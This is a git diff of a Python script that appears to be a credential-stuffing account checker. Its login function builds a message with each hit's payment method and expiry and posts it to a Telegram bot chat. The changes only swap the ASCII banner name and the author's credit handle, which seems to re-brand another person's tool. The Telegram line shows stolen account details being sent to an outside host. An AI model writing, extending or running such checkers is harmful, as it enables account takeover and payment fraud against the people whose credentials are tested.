@@ -9,7 +9,7 @@ console = Console()
 
 def print_red_banner():
     fig = pyfiglet.Figlet(font="poison")
-    banner = fig.renderText("R4X")
+    banner = fig.renderText("RAV3N")
     colored_banner = f"[bold red]{banner}[/]"
     console.clear()
     console.print(colored_banner, justify="center")
@@ -114,7 +114,7 @@ def login(email, pasw, tok, ID):
 ➙𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐌𝐄𝐓𝐇𝐎𝐃 ➾ {payment}
 ➙𝐄𝐗𝐏𝐈𝐑𝐘 ➾ {expiry}
 
-⋘──────━𓆩 @im4rex 𓆪━──────⋙ 
+⋘──────━𓆩 @sigmaraven68 𓆪━──────⋙ 
 """           
                     print(f' {G}{msg}')
                     requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={msg}')
